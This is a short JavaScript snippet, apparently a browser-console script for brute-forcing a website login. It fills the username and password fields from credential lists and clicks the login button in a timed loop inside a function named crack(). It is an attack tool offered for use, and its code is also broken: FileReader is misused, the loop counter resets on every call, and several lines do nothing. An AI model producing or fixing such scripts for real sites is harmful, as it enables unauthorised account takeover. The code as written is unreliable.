var username = document.getElementById(/*The username input box ID*/);
var password = document.getElementById(/*The password input box ID*/);
var loginButton = document.getElementById(/*The Login Button ID*/);

var usernameFile =  new FileReader();
var usernames = usernameFile.readAsDataURL(/*Your username file link in array format*/)

var passwordFile = new FileReader();
var passwords = passwordFile.readAsDataURL(/*Your password file link in array format*/);

function crack() {
    i = 0;
    username.value = usernames;
    password.value = passwords;
    usernames[i];
    passwords[i];
    loginButton.click();
    window.focus();
    i++
}

setInterval(crack, 1000);
